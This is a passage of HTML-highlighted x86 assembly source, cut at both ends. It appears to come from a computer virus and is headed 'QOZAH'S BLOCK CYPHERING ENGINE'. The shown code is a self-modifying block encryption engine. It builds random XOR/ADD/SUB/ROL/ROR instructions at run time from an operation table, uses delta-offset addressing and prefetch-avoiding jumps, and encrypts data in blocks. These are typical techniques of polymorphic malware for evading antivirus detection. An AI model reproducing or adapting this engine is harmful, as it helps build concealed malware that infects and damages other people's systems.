            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">secondary_buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">movsd</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateInstructions</span><span class="sc0">
            </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">Ended_Stuff</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">TimeKindOf</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Minute</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Second</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Miliseconds</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">



</span><span class="sc5">InstToRead</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; mov ebx, 12h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; 64 en 04</span><span class="sc0">




</span><span class="sc1">;===========================&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;==============================</span><span class="sc0">
</span><span class="sc1">;                     QOZAH'S BLOCK CYPHERING ENGINE</span><span class="sc0">
</span><span class="sc1">;===========================&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;==============================</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">Create_Table</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">31d</span><span class="sc0">                 </span><span class="sc1">; Create 31 bytes</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OperationTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">SixLoops</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomNumber</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">SixLoops</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">GetBlocksReminder</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08d</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; CX=number of blocks, DX=Remainder</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">EncryptBlock</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; ESI is supposed begin crypt offset</span><span class="sc0">
                                        </span><span class="sc1">;while EAX is the shit to crypt</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OperationTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;            lodsd</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24d</span><span class="sc0">
</span><span class="sc5">MakeRound</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">90909090h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">          </span><span class="sc1">; Value to load ( 8 bits )</span><span class="sc0">

       </span><span class="sc1">; 34h XOR, 2CH SUB, 04h ADD, C0h C8h ROL, c0h c0h ROR</span><span class="sc0">

            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">XorOrRox</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">   </span><span class="sc1">; ADD AL,XX</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SubInst</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">028h</span><span class="sc0">  </span><span class="sc1">; SUB AL,XX</span><span class="sc0">
</span><span class="sc5">SubInst</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OpCodeStoredA</span><span class="sc0">

</span><span class="sc5">XorOrRox</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">DealWithXor</span><span class="sc0">

</span><span class="sc5">RorOrXor</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0c0c0h</span><span class="sc0"> </span><span class="sc1">; ROL AL,XX</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">MakeRol</span><span class="sc0">         </span><span class="sc1">; IT'S MADE THE 'OTHER' WAY</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">  </span><span class="sc1">; ROL AL,XX</span><span class="sc0">
</span><span class="sc5">MakeRol</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                            </span><span class="sc1">; Ecx equ value to load, that is 7 bits for you</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OpCodeStoredA</span><span class="sc0">


</span><span class="sc5">DealWithXor</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">034h</span><span class="sc0"> </span><span class="sc1">; XOR AL,XX</span><span class="sc0">

</span><span class="sc5">OpCodeStoredA</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; Now it's time to obtain the cypher</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; DX=0, DL=value to make operation</span><span class="sc0">

</span><span class="sc5">MakeValuesForOperation</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; points to +2 or +3 in the beggining</span><span class="sc0">
            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoOperand</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">NoOperand</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">MakeValuesForOperation</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Type1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EncryptOperation</span><span class="sc0">
</span><span class="sc5">Type1</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; Avoid prefetch</span><span class="sc0">

                    </span><span class="sc1">; One instruction made ( out of 4 )</span><span class="sc0">

</span><span class="sc5">EncryptOperation</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">   </span><span class="sc1">; work in AL. One byte excess to fit dword</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">        </span><span class="sc1">; Next byte this way -&gt;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">EncryptOperation</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SecondCryptA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">SecondCryptA</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">   </span><span class="sc1">; work in AL. One byte excess to fit dword</span><span class="sc0">


            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FinishedCryptBlock</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MakeRound</span><span class="sc0">     </span><span class="sc1">; 24 times ( 24 encryptions in 4 blocks )</span><span class="sc0">
</span><span class="sc5">FinishedCryptBlock</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">        </span><span class="sc1">; Adjust last one.</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">Get_some_for_offset</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">DontAddDl</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">DontAddDl</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Get_some_for_offset</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">


</span><span class="sc5">GetDl</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc1">; First of all, we get seven bits from the beggining of the</span><span class="sc0">
            </span><span class="sc1">;table, that is, the offset relative to the table in bits</span><span class="sc0">
            </span><span class="sc1">;to get our value.</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OperationTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7d</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_some_for_offset</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc1">; Now we have the desired offset so that we just get another</span><span class="sc0">
            </span><span class="sc1">;value ( this time 5 bits ), which we will always use to</span><span class="sc0">
            </span><span class="sc1">;operate.</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5d</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_some_for_offset</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">MessTwoBlocks</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDl</span><span class="sc0">

            </span><span class="sc1">; This value will be from now stored in edl then. Now we</span><span class="sc0">
            </span><span class="sc1">;start checking the table.</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc0">        </span><span class="sc1">; beggining of that last 8 bits,</span><span class="sc0">
                                    </span><span class="sc1">;as cfh is the beginning of the</span><span class="sc0">
                                    </span><span class="sc1">;last operation</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">Test_Rotate</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">We_Dont_Rotate</span><span class="sc0">

            </span><span class="sc1">; If we do rotate, we do it now, with dl value</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DlHere</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
</span><span class="sc5">DlHere</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


            </span><span class="sc1">; Rotated or not, the second bunch is still in EAX, while</span><span class="sc0">
            </span><span class="sc1">;the first one is in ESI. So, we test the second byte.</span><span class="sc0">

</span><span class="sc5">We_Dont_Rotate</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OperationBlock</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">   </span><span class="sc1">; add esi, eax</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">OperationBlock</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OperationBlock</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">33h</span><span class="sc0">   </span><span class="sc1">; xor esi, eax</span><span class="sc0">

</span><span class="sc5">OperationBlock</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; Prefetch</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Test_Rotate</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">Encrypt64KbBlocks</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptBlock</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptBlock</span><span class="sc0">        </span><span class="sc1">; So we have them in ebx and eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessTwoBlocks</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">StoreOneBlock</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; We store them two</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">


</span><span class="sc5">Encrypt_stuff</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetBlocksReminder</span><span class="sc0">       </span><span class="sc1">; DX is the last one length</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">CheckLasting</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; DX = REMAINDER, CX = NUMBER O BLOCKS</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; No more ?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Go_last_block</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Encrypt64KbBlocks</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StoreOneBlock</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckLasting</span><span class="sc0">

</span><span class="sc5">Go_last_block</span><span class="sc4">:</span><span class="sc0">
